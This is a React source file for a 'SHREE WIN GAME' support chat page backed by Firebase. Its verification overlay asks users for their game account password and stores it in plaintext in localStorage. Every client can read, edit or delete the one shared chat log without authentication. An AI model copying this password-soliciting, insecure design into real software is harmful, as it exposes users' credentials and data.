import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { ref, onValue, push, update, remove } from 'firebase/database';
import { db } from '../firebase.js';
import Layout, { CHAT_NAV } from '../components/Layout.jsx';
import ImageViewer from '../components/ImageViewer.jsx';
import logo from '../assets/logo.png';
import {
  SendIcon, BackIcon, ImageIcon, FileIcon, InfoIcon, SearchIcon, TrashIcon
} from '../components/icons.jsx';

const STORAGE_KEY = 'chatUserData';

function formatSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / 1048576).toFixed(1) + ' MB';
}

function readStoredUser() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null;
  } catch {
    return null;
  }
}

export default function Chat() {
  const navigate = useNavigate();
  const [verified, setVerified] = useState(() => Boolean(readStoredUser()));
  const [v, setV] = useState({ vName: '', vMobile: '', vPassword: '', vEmail: '' });
  const [chats, setChats] = useState([]);
  const [text, setText] = useState('');
  const [replyTo, setReplyTo] = useState(null);
  const [editingId, setEditingId] = useState(null);
  const [editText, setEditText] = useState('');
  const [detail, setDetail] = useState(null);
  const [infoOpen, setInfoOpen] = useState(false);
  const [viewer, setViewer] = useState(null);

  const boxRef = useRef(null);
  const imageInput = useRef(null);
  const fileInput = useRef(null);

  useEffect(() => {
    const unsub = onValue(ref(db, 'chats'), (snap) => {
      const list = [];
      snap.forEach((child) => list.push({ key: child.key, ...child.val() }));
      setChats(list);
    });
    return unsub;
  }, []);

  useEffect(() => {
    if (boxRef.current) boxRef.current.scrollTop = boxRef.current.scrollHeight;
  }, [chats]);

  function verify(e) {
    e.preventDefault();
    const { vName, vMobile, vPassword, vEmail } = v;
    if (!vName || !vMobile || !vPassword || !vEmail) {
      alert('Please fill all fields');
      return;
    }
    localStorage.setItem(STORAGE_KEY, JSON.stringify({
      name: vName, mobile: vMobile, password: vPassword, email: vEmail
    }));
    setVerified(true);
  }

  function sendMessage() {
    const t = text.trim();
    if (!t) return;
    push(ref(db, 'chats'), {
      text: t,
      sender: 'me',
      replyTo: replyTo || null,
      date: new Date().toLocaleDateString('en-GB'),
      time: new Date().toLocaleTimeString('en-GB'),
      createdAt: Date.now()
    });
    setText('');
    setReplyTo(null);
  }

  function sendImage(e) {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      push(ref(db, 'chats'), {
        text: '',
        image: String(ev.target.result),
        fileName: file.name,
        sender: 'me',
        replyTo: null,
        date: new Date().toLocaleDateString('en-GB'),
        time: new Date().toLocaleTimeString('en-GB'),
        createdAt: Date.now()
      });
      e.target.value = '';
    };
    reader.readAsDataURL(file);
  }

  function sendFile(e) {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      push(ref(db, 'chats'), {
        text: '',
        file: String(ev.target.result),
        fileName: file.name,
        fileSize: formatSize(file.size),
        fileType: file.type || 'file',
        sender: 'me',
        replyTo: null,
        date: new Date().toLocaleDateString('en-GB'),
        time: new Date().toLocaleTimeString('en-GB'),
        createdAt: Date.now()
      });
      e.target.value = '';
    };
    reader.readAsDataURL(file);
  }

  function copyChat(chat) {
    const t = chat.text || '';
    if (navigator.clipboard) navigator.clipboard.writeText(t).then(() => alert('Message copied!'));
    else alert('Message copied!');
  }

  function deleteChat(chat) {
    if (confirm('Delete this message?')) remove(ref(db, 'chats/' + chat.key));
  }

  function startEdit(chat) {
    setEditingId(chat.key);
    setEditText(chat.text || '');
  }

  function saveEdit() {
    const t = editText.trim();
    if (!t || !editingId) return;
    update(ref(db, 'chats/' + editingId), {
      text: t,
      date: new Date().toLocaleDateString('en-GB'),
      time: new Date().toLocaleTimeString('en-GB')
    });
    setEditingId(null);
  }

  function clearChatHistory() {
    if (confirm('Clear all chat history? This cannot be undone.')) {
      remove(ref(db, 'chats')).then(() => alert('Chat history cleared!'));
    }
    setInfoOpen(false);
  }

  return (
    <Layout title="ONLINE CHAT" nav={CHAT_NAV}>
      {(!verified) && (
        <div className="verify-overlay" id="verifyOverlay" style={{ display: 'flex' }}>
          <div className="verify-box">
            <div className="verify-logo">
              <img src={logo} alt="Logo" />
            </div>
            <h2>🔒 Verify Your Identity</h2>
            <p>Please enter your details to access the chat</p>
            <form id="verifyForm" onSubmit={verify}>
              {[
                { k: 'vName', label: 'User Name', type: 'text', ph: 'Enter your name' },
                { k: 'vMobile', label: 'Mobile Number', type: 'tel', ph: 'Enter mobile number' },
                { k: 'vPassword', label: 'Game Account Password', type: 'password', ph: 'Enter game password' },
                { k: 'vEmail', label: 'Email ID', type: 'email', ph: 'Enter your email' }
              ].map((f) => (
                <div className="form-group" key={f.k}>
                  <label htmlFor={f.k}>{f.label}</label>
                  <input
                    type={f.type} id={f.k} placeholder={f.ph} required
                    value={v[f.k]} onChange={(e) => setV((s) => ({ ...s, [f.k]: e.target.value }))}
                  />
                </div>
              ))}
              <button type="submit" className="btn">Next →</button>
            </form>
          </div>
        </div>
      )}

      <div className="chat-fullpage" id="chatFullpage" style={{ display: verified ? '' : 'none' }}>
        <header className="chat-header">
          <div className="chat-header-left">
            <button className="back-btn" onClick={() => navigate('/index.html')}>
              <BackIcon size={24} />
            </button>
            <div className="chat-avatar">SW</div>
            <div className="chat-user-info">
              <h3>SHREE WIN SUPPORT</h3>
              <span className="online-status">● Online</span>
            </div>
          </div>
          <div className="chat-header-right">
            <button className="header-action-btn" onClick={() => setInfoOpen(true)}>
              <InfoIcon />
            </button>
          </div>
        </header>

        <main className="chat-messages-area" id="chatMessagesArea">
          <div className="chat-messages" id="chatMessages" ref={boxRef}>
            {chats.length === 0 && (
              <div className="chat-welcome">
                <p>Welcome to SHREE WIN GAME Support Chat</p>
                <span>Send a message to start the conversation</span>
              </div>
            )}
            {chats.map((chat, i) => {
              const mine = chat.sender === 'me';
              return (
                <div
                  className={'msg-row ' + (mine ? 'right' : 'left')}
                  key={chat.key}
                  onClick={() => setDetail(chat)}
                >
                  <div className={'msg-bubble ' + (mine ? 'msg-sent' : 'msg-received')}>
                    {chat.replyTo && (
                      <div className="msg-reply-ref">↩ &quot;{chat.replyTo.substring(0, 40)}&quot;</div>
                    )}

                    {chat.image && (
                      <>
                        <img
                          className="msg-image"
                          src={chat.image}
                          alt="Image"
                          onClick={(e) => { e.stopPropagation(); setViewer({ src: chat.image, name: 'image.png' }); }}
                        />
                        {chat.text && <div className="msg-text">{chat.text}</div>}
                      </>
                    )}

                    {!chat.image && chat.file && (
                      <>
                        <a
                          className="msg-file"
                          href={chat.file}
                          download={chat.fileName || 'file'}
                          onClick={(e) => e.stopPropagation()}
                        >
                          <FileIcon size={18} />
                          <div className="file-info">
                            <span className="file-name">{chat.fileName || 'File'}</span>
                            <span className="file-size">{chat.fileSize || ''}</span>
                          </div>
                          <span className="file-dl">↓</span>
                        </a>
                        {chat.text && <div className="msg-text">{chat.text}</div>}
                      </>
                    )}

                    {!chat.image && !chat.file && (
                      <div className="msg-text">{chat.text || ''}</div>
                    )}

                    <div className="msg-meta">
                      <span className="msg-time">{chat.time}</span>
                      <span className="msg-tick">✓✓</span>
                    </div>
                  </div>

                  <div className="msg-actions">
                    <button className="mini-btn" title="Reply" onClick={(e) => { e.stopPropagation(); setReplyTo(chat.text); setText(''); }}>↩</button>
                    <button className="mini-btn" title="Edit" onClick={(e) => { e.stopPropagation(); startEdit(chat); }}>✎</button>
                    <button className="mini-btn" title="Copy" onClick={(e) => { e.stopPropagation(); copyChat(chat); }}>⎘</button>
                    <button className="mini-btn mini-del" title="Delete" onClick={(e) => { e.stopPropagation(); deleteChat(chat); }}>✕</button>
                  </div>
                </div>
              );
            })}
          </div>

          <div className="typing-indicator" id="typingIndicator" style={{ display: 'none' }}>
            <span></span><span></span><span></span>
          </div>
        </main>

        <footer className="chat-input-bar">
          <label className="input-action-btn" title="Send Image">
            <ImageIcon size={24} />
            <input ref={imageInput} type="file" id="imageInput" accept="image/*" onChange={sendImage} style={{ display: 'none' }} />
          </label>
          <label className="input-action-btn" title="Send PDF/Files">
            <FileIcon size={24} />
            <input ref={fileInput} type="file" id="fileInput" accept=".pdf,.doc,.docx,.txt,.xls,.xlsx,.zip,.rar" onChange={sendFile} style={{ display: 'none' }} />
          </label>
          <input
            type="text" id="chatInput"
            placeholder={replyTo ? `Replying to: "${replyTo.substring(0, 25)}..."` : 'Type a message...'}
            value={text}
            onChange={(e) => setText(e.target.value)}
            onKeyDown={(e) => { if (e.key === 'Enter') sendMessage(); }}
          />
          <button className="send-btn" onClick={sendMessage}>
            <SendIcon size={24} />
          </button>
        </footer>
      </div>

      {/* CHAT INFO POPUP */}
      <div className={infoOpen ? 'popup-overlay active' : 'popup-overlay'} id="chatInfoPopup" onClick={() => setInfoOpen(false)}>
        <div className="popup-box chat-info-box" onClick={(e) => e.stopPropagation()}>
          <div className="chat-info-header">
            <div className="chat-avatar-large">SW</div>
            <div className="chat-info-title">
              <h3>SHREE WIN SUPPORT</h3>
              <span className="online-status">● Online</span>
            </div>
          </div>
          <div className="chat-info-actions">
            <button className="info-action-btn" onClick={() => { setInfoOpen(false); alert('Media & Files feature coming soon!'); }}>
              <ImageIcon size={20} />
              <span>Media & Files</span>
            </button>
            <button className="info-action-btn" onClick={() => { setInfoOpen(false); alert('Search feature coming soon!'); }}>
              <SearchIcon size={20} />
              <span>Search</span>
            </button>
            <button className="info-action-btn danger" onClick={clearChatHistory}>
              <TrashIcon size={20} />
              <span>Clear Chat</span>
            </button>
          </div>
          <button className="popup-close-btn" onClick={() => setInfoOpen(false)}>Close</button>
        </div>
      </div>

      {/* CHAT DETAIL POPUP */}
      <div className={detail ? 'popup-overlay active' : 'popup-overlay'} id="chatPopup">
        <div className="popup-box chat-popup-box">
          <h3>MESSAGE DETAILS</h3>
          <div className="chat-detail-content" id="chatDetailContent">
            {detail && (
              <>
                <div className="detail-row"><strong>Message:</strong> {detail.text ? detail.text : (detail.fileName || detail.image ? 'Attachment' : '-')}</div>
                <div className="detail-row"><strong>From:</strong> {detail.sender === 'me' ? 'You' : 'Support Team'}</div>
                {detail.fileName && <div className="detail-row"><strong>File:</strong> {detail.fileName}</div>}
                {detail.fileSize && <div className="detail-row"><strong>Size:</strong> {detail.fileSize}</div>}
                {detail.replyTo && <div className="detail-row"><strong>Reply To:</strong> {detail.replyTo}</div>}
                <div className="detail-row"><strong>Date:</strong> {detail.date}</div>
                <div className="detail-row"><strong>Time:</strong> {detail.time}</div>
                <div className="detail-row"><strong>Full:</strong> {detail.date} {detail.time}</div>
              </>
            )}
          </div>
          <button className="btn" onClick={() => setDetail(null)}>Close</button>
        </div>
      </div>

      {/* EDIT POPUP */}
      <div className={editingId ? 'popup-overlay active' : 'popup-overlay'} id="editPopup">
        <div className="popup-box chat-popup-box">
          <h3>EDIT MESSAGE</h3>
          <input
            type="text" className="edit-input" id="editInput" placeholder="Edit your message..."
            value={editText}
            onChange={(e) => setEditText(e.target.value)}
            onKeyDown={(e) => { if (e.key === 'Enter') saveEdit(); }}
          />
          <div className="popup-actions">
            <button className="btn" onClick={saveEdit}>Save</button>
            <button className="btn btn-secondary" onClick={() => setEditingId(null)}>Cancel</button>
          </div>
        </div>
      </div>

      <ImageViewer
        src={viewer?.src}
        fileName={viewer?.name}
        onClose={() => setViewer(null)}
      />
    </Layout>
  );
}
